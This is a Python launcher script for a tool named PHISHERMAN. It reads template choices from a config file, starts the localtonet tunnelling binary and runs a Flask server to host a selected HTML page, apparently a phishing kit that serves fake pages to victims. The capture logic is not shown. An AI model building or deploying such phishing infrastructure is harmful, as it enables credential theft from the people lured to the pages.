import os
import sys
import configparser
import time
from colorama import Fore, Style
import subprocess

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def type_text(text, color=Fore.GREEN, par=0.05):
    colored_text = color + text + Style.RESET_ALL
    for char in colored_text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(par)

def get_colored_figlet_from_file(filepath='figlet.txt', color=Fore.GREEN):
    try:
        with open(filepath, 'r') as f:
            drawing = f.read()
        return color + drawing + Style.RESET_ALL
    except FileNotFoundError:
        return Fore.RED + f"Error: Figlet file '{filepath}' not found." + Style.RESET_ALL
    except Exception as e:
        return Fore.RED + f"Error reading figlet file '{filepath}': {e}" + Style.RESET_ALL

def load_config(config_filename="config.ini"):
    config = configparser.ConfigParser()
    try:
        config.read(config_filename)
        return config
    except configparser.Error as e:
        print(Fore.RED + f"Error parsing '{config_filename}': {e}" + Style.RESET_ALL)
        return None

def start_localtonet():
    print(Fore.YELLOW + "Starting localtonet...\n" + Style.RESET_ALL)
    try:
        subprocess.run(['./localtonet'])
        print(Fore.GREEN + "localtonet started and running.\n" + Style.RESET_ALL)
    except FileNotFoundError:
        print(Fore.RED + "Error: localtonet binary not found.\n" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error starting localtonet: {e}\n" + Style.RESET_ALL)

def run_flask_app(t):
    subprocess.run([sys.executable, "hosting.py", "--template", t], check=True)

if __name__ == "__main__":
    clear_screen()
    figlet_art = get_colored_figlet_from_file()
    print(figlet_art)
    type_text(text="Author: 'pulse-empire' on GitHub\n", par=0.03)
    type_text(text="Collaborator: 'Alphabetikal' on GitHub\n", par=0.03)
    time.sleep(0.5)
    type_text(text='You are using PHISHERMAN version 1.0.0', par=0.03)
    print()
    time.sleep(0.3)

    config = load_config()
    if config:
        template = config.get("selections", "template", fallback=None)
        host_choice = config.get("selections", "hosting", fallback=None)
        template_tuner = config.get("selections", "tuner", fallback=None)
        template_path = os.path.join(template, f"{template_tuner}.html").replace('\\', '/')

        if host_choice == "localtonet.com":
            start_localtonet()
            time.sleep(2)

        if template and template_tuner:
            run_flask_app(f"{template_path}")
            if host_choice not in ["localhost", "localtonet", "localtonet.com"]:
                print(Fore.YELLOW + f"Warning: Hosting choice '{host_choice}' not yet fully implemented.\n" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "Warning: Template, tuner, or hosting not fully selected in config.ini for hosting.\n" + Style.RESET_ALL)
    else:
        print(Fore.RED + "Error: Could not load config.ini.\n" + Style.RESET_ALL)

    print()